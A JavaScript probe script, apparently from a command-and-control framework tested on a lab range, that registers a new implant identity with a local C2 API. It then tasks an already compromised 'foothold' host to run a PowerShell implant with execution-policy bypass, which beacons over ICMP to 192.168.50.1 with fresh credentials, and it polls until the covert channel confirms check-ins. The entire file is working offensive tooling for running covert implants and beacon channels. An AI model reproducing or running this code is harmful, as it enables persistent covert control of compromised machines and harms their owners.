// probe-icmp-visible.mjs — one-shot visible run of the guest ICMP agent with fresh
// creds, proving/falsifying the type-0 wire end to end. File-based on purpose:
// building this command through `node -e` + bash quoting mangles backslashes (learned
// the hard way — the guest got 'C:WindowsSystem32agentbox arvel-agent.ps1').
const API = 'http://127.0.0.1:8971';
const FOOTHOLD = process.argv[2] || 'f0f9ebd8f762';
const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
const j = async (p, b) => (await fetch(API + p, b ? { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify(b) } : undefined)).json();

const reg = await j('/api/channel/agent', { action: 'register', label: 'icmp-visible-probe', tags: ['range', 'icmp'] });
console.log('probe identity:', reg.agentId);
const cmd = 'powershell -NoProfile -ExecutionPolicy Bypass -File C:\\Windows\\System32\\agentbox\\varvel-agent.ps1 -Url icmp://192.168.50.1 -AgentId ' + reg.agentId + ' -Token ' + reg.token + ' -Transport icmp -Interval 800 -Jitter 0 -MaxLoops 1';
console.log('cmd:', cmd);
const t = await j('/api/channel/task', { agentId: FOOTHOLD, kind: 'shell', data: cmd });
console.log('probe task:', t.taskId);
for (let i = 0; i < 45; i++) {
  await sleep(2000);
  const ch = await j('/api/channel');
  const me = (ch.agents || []).find((a) => a.agentId === reg.agentId);
  if (me && me.checkins > 0) { console.log('WIRE CONFIRMED: guest frames reached the channel — checkins=' + me.checkins + ' liveVerified=' + ch.icmp.liveVerified); process.exit(0); }
  const { tasks } = await j('/api/channel/tasks?agent=' + FOOTHOLD);
  const x = (tasks || []).find((y) => y.taskId === t.taskId);
  if (x && x.status === 'resulted') { console.log('agent exited, channel saw nothing. output:', JSON.stringify(x.resultPreview)); process.exit(1); }
}
console.log('timeout with no signal');
process.exit(1);
